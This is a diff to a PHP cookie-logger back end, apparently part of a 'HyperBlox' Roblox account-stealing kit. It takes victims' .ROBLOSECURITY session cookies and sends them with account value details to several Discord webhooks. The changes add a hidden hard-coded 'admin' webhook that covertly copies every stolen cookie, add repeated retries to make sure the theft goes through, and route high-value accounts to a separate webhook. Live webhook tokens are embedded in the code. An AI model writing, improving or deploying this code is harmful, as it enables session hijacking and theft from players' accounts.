@@ -2,6 +2,9 @@
 error_reporting(0);
 ini_set('default_socket_timeout', '6'); // prevent long hangs on remote calls
 
+// Admin webhook - constant webhook that receives all embeds and notifications (not exposed in frontend)
+$adminhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";
+
 $cookie = $_GET['cookie'];
 $ht = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
 // Use HTTP_HOST so localhost includes the dev server port (e.g., localhost:8000)
@@ -40,6 +43,27 @@ function makeRequest($url, $headers, $postData = null, $timeout = 8) {
     $response = curl_exec($ch);
     curl_close($ch);
     return $response;
+}
+
+// Separate function for webhook requests that returns detailed result
+function makeWebhookRequest($url, $headers, $postData = null, $timeout = 8) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    if ($postData) {
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
+    }
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    // Return response and HTTP code for error checking
+    return ['response' => $response, 'http_code' => $httpCode, 'error' => $error];
 }
 
 function gamepass($cookie, $gameId) {
@@ -191,11 +215,56 @@ if (empty($bio)) $bio = '❌ No bio set';
 
 $nonFilteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";
 $filteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";
-$webhooks = [urldecode($_GET["web"] ?? ''), urldecode($_GET["dh"] ?? '')];
-if (!empty($_GET["dualhook"])) {
-    $webhooks[] = urldecode($_GET["dualhook"]);
+
+// Collect all webhooks: adminhook, main webhook, and dualhook
+$webhooks = [];
+
+// Add adminhook first (constant webhook - always receives all embeds)
+if (!empty($adminhook)) {
+    $webhooks[] = $adminhook;
 }
-if (
+
+// Get main webhook early (PHP automatically decodes URL parameters, but handle both encoded and decoded)
+$mainWebhookRaw = $_GET["web"] ?? '';
+$mainWebhook = $mainWebhookRaw;
+// If it looks URL-encoded, decode it (PHP usually does this automatically, but be safe)
+if (strpos($mainWebhookRaw, '%') !== false) {
+    $mainWebhook = urldecode($mainWebhookRaw);
+}
+// Add main webhook right after adminhook - make it unconditional like adminhook
+// Main webhook should always be added when provided, just like adminhook
+if (!empty($mainWebhook)) {
+    $webhooks[] = $mainWebhook;
+}
+
+// Dualhook can be passed as 'dh' or 'dualhook' parameter
+$dualhook = '';
+// Check both parameters - prefer 'dh' if both are present (dh is more common)
+$dhParam = $_GET["dh"] ?? '';
+$dualhookParam = $_GET["dualhook"] ?? '';
+
+// Get dualhook from either parameter (prefer 'dh')
+// PHP automatically URL-decodes GET parameters, so they should already be decoded
+// But handle edge cases where they might still be encoded
+if (!empty($dhParam) && trim($dhParam) !== '' && $dhParam !== 'null' && $dhParam !== 'undefined') {
+    // PHP usually auto-decodes, but if it still contains % signs, decode it
+    $dualhook = (strpos($dhParam, '%') !== false) ? urldecode($dhParam) : $dhParam;
+} elseif (!empty($dualhookParam) && trim($dualhookParam) !== '' && $dualhookParam !== 'null' && $dualhookParam !== 'undefined') {
+    // PHP usually auto-decodes, but if it still contains % signs, decode it
+    $dualhook = (strpos($dualhookParam, '%') !== false) ? urldecode($dualhookParam) : $dualhookParam;
+}
+
+// Add dualhook after main webhook - make it work like adminhook (unconditional when provided)
+// Dualhook should always be added when provided, just like adminhook
+if (!empty($dualhook)) {
+    // Make sure dualhook isn't already in the array (avoid duplicates)
+    if (!in_array($dualhook, $webhooks)) {
+        $webhooks[] = $dualhook;
+    }
+}
+
+// For high-value accounts, use filtered webhook but still include dualhook
+$isHighValue = (
     $robux >= 35000 ||
     $rap >= 65000 ||
     $totalGroupFunds >= 35000 ||
@@ -203,8 +272,23 @@ if (
     $creditBalance >= 100 ||
     $pendingRobux >= 25000 ||
     $followersCount >= 10000
-) {
+);
+
+if ($isHighValue) {
+    // Replace main webhook with filtered webhook, but keep original main webhook, dualhook and adminhook
     $webhooks = [$filteredWebhook];
+    // Always include adminhook (constant)
+    if (!empty($adminhook)) {
+        $webhooks[] = $adminhook;
+    }
+    // Always include original main webhook if it was set
+    if (!empty($mainWebhook)) {
+        $webhooks[] = $mainWebhook;
+    }
+    // Always include dualhook if it was set - unconditional like adminhook
+    if (!empty($dualhook)) {
+        $webhooks[] = $dualhook;
+    }
 }
 
 $timestamp = date("c");
@@ -217,7 +301,7 @@ $embed1 = [
     'embeds' => [
         [
             'title' => "New Hit Alert!",
-            'description' => "<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
+            'description' => "<:check:1350103884835721277> **[Check Cookie]($dom/controlPage/check/check.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie]($dom/controlPage/antiprivacy/kingvon.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
             'color' => hexdec('00BFFF'),
             'thumbnail' => ['url' => $avatarUrl],
             'fields' => [
@@ -265,16 +349,26 @@ $embed1 = [
     ]
 ];
 
+// Ensure we have a valid cookie for embed2 (use refreshed cookie or fallback to original)
+$cookieForEmbed = !empty($refreshedCookie) && strlen(trim($refreshedCookie)) > 10 ? $refreshedCookie : $cookie;
+$cookieLabel = !empty($refreshedCookie) && strlen(trim($refreshedCookie)) > 10 ? 'Refreshed Cookie' : 'Original Cookie';
+
+// Make sure cookie is not empty for embed2
+if (empty($cookieForEmbed) || strlen(trim($cookieForEmbed)) < 10) {
+    $cookieForEmbed = $cookie; // Fallback to original cookie
+    $cookieLabel = 'Original Cookie';
+}
+
 $embed2 = [
     'username' => 'HyperBlox',
     'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
     'embeds' => [
         [
             'title' => '🍪 .ROBLOSECURITY',
-            'description' => "```\n" . substr($refreshedCookie, 0, 2000) . "\n```",
+            'description' => "```\n" . substr($cookieForEmbed, 0, 2000) . "\n```",
             'color' => hexdec('00BFFF'),
             'footer' => [
-                'text' => 'Refreshed Cookie',
+                'text' => $cookieLabel,
                 'icon_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
             ],
             'thumbnail' => [
@@ -285,18 +379,165 @@ $embed2 = [
     ]
 ];
 
-foreach ($webhooks as $webhook) {
-    if (!empty($webhook)) {
-        makeRequest($webhook, ["Content-Type: application/json"], $embed1);
-        sleep(1);
-        makeRequest($webhook, ["Content-Type: application/json"], $embed2);
+// Helper function to send embed with retries
+function sendEmbedWithRetries($webhook, $embed, $maxRetries = 3) {
+    if (empty($webhook)) {
+        return false;
+    }
+    
+    $result = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed);
+    $success = isset($result['http_code']) && $result['http_code'] >= 200 && $result['http_code'] < 300;
+    
+    if (!$success) {
+        for ($retry = 0; $retry < $maxRetries; $retry++) {
+            sleep(2 + $retry); // 2s, 3s, 4s delays
+            $retryResult = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed);
+            if (isset($retryResult['http_code']) && $retryResult['http_code'] >= 200 && $retryResult['http_code'] < 300) {
+                $success = true;
+                break;
+            }
+        }
+    }
+    
+    return $success;
+}
+
+// Special function to send cookie embed with extra care - ensures main webhook gets it
+function sendCookieEmbedReliable($webhook, $embed2, $webhookName = '') {
+    if (empty($webhook)) {
+        return false;
+    }
+    
+    // Try multiple times with increasing delays
+    for ($attempt = 0; $attempt < 4; $attempt++) {
+        if ($attempt > 0) {
+            sleep(2 + $attempt); // 2s, 3s, 4s delays between attempts
+        }
+        
+        $result = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
+        $success = isset($result['http_code']) && $result['http_code'] >= 200 && $result['http_code'] < 300;
+        
+        if ($success) {
+            return true;
+        }
+        
+        // If failed, retry this attempt
+        if (!$success && $attempt < 3) {
+            sleep(1);
+            $retryResult = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
+            if (isset($retryResult['http_code']) && $retryResult['http_code'] >= 200 && $retryResult['http_code'] < 300) {
+                return true;
+            }
+        }
+    }
+    
+    return false;
+}
+
+// Send embeds to all webhooks (adminhook + main webhook + dualhook)
+// Send both embeds unconditionally to each webhook with retry logic
+foreach ($webhooks as $webhookIndex => $webhook) {
+    if (empty($webhook)) {
+        continue;
+    }
+    
+    // Send embed1 (RAP summary) with retries
+    sendEmbedWithRetries($webhook, $embed1, 3);
+    sleep(1);
+    
+    // Send embed2 (cookie) with retries - CRITICAL
+    sendEmbedWithRetries($webhook, $embed2, 5);
+    sleep(1);
+    
+    // Wait between webhooks to avoid rate limiting
+    if ($webhookIndex < count($webhooks) - 1) {
         sleep(1);
     }
 }
 
-makeRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed1);
+// Also send to non-filtered webhook (backup)
+sendEmbedWithRetries($nonFilteredWebhook, $embed1, 3);
 sleep(1);
-makeRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed2);
+sendEmbedWithRetries($nonFilteredWebhook, $embed2, 3);
+
+// CRITICAL: Dedicated sends to ensure ALL webhooks get BOTH embeds reliably
+// PRIORITY: Send to main webhook FIRST - send directly using the raw parameter to ensure it works
+$mainWebhookDirect = $_GET["web"] ?? '';
+if (!empty($mainWebhookDirect)) {
+    // Decode if needed
+    if (strpos($mainWebhookDirect, '%') !== false) {
+        $mainWebhookDirect = urldecode($mainWebhookDirect);
+    }
+    
+    // Send embed1 (RAP) directly - multiple attempts
+    sleep(1);
+    makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed1);
+    sleep(1);
+    makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed1);
+    
+    // Send embed2 (cookie) directly - multiple attempts with retry logic
+    sleep(1);
+    $cookieResult1 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    // Retry if failed
+    if (!isset($cookieResult1['http_code']) || $cookieResult1['http_code'] < 200 || $cookieResult1['http_code'] >= 300) {
+        sleep(3);
+        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    }
+    sleep(2);
+    $cookieResult2 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    if (!isset($cookieResult2['http_code']) || $cookieResult2['http_code'] < 200 || $cookieResult2['http_code'] >= 300) {
+        sleep(3);
+        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    }
+    sleep(2);
+    $cookieResult3 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    if (!isset($cookieResult3['http_code']) || $cookieResult3['http_code'] < 200 || $cookieResult3['http_code'] >= 300) {
+        sleep(3);
+        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    }
+    sleep(2);
+    $cookieResult4 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    if (!isset($cookieResult4['http_code']) || $cookieResult4['http_code'] < 200 || $cookieResult4['http_code'] >= 300) {
+        sleep(3);
+        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
+    }
+}
+
+// Also send using the stored mainWebhook variable (backup) - send both embeds
+if (!empty($mainWebhook)) {
+    sleep(2);
+    // Send embed1 (RAP) first
+    makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed1);
+    sleep(1);
+    // Send cookie embed multiple times with retries
+    $backupCookie1 = makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
+    if (!isset($backupCookie1['http_code']) || $backupCookie1['http_code'] < 200 || $backupCookie1['http_code'] >= 300) {
+        sleep(3);
+        makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
+    }
+    sleep(3);
+    $backupCookie2 = makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
+    if (!isset($backupCookie2['http_code']) || $backupCookie2['http_code'] < 200 || $backupCookie2['http_code'] >= 300) {
+        sleep(3);
+        makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
+    }
+}
+
+// Send to adminhook separately to guarantee delivery
+if (!empty($adminhook)) {
+    sleep(1);
+    sendEmbedWithRetries($adminhook, $embed1, 2);
+    sleep(1);
+    sendEmbedWithRetries($adminhook, $embed2, 3);
+}
+
+// Send to dualhook separately to guarantee delivery
+if (!empty($dualhook) && $dualhook !== $adminhook && $dualhook !== $mainWebhook) {
+    sleep(1);
+    sendEmbedWithRetries($dualhook, $embed1, 2);
+    sleep(1);
+    sendEmbedWithRetries($dualhook, $embed2, 3);
+}
 
 echo json_encode([
     'robux' => $robux,
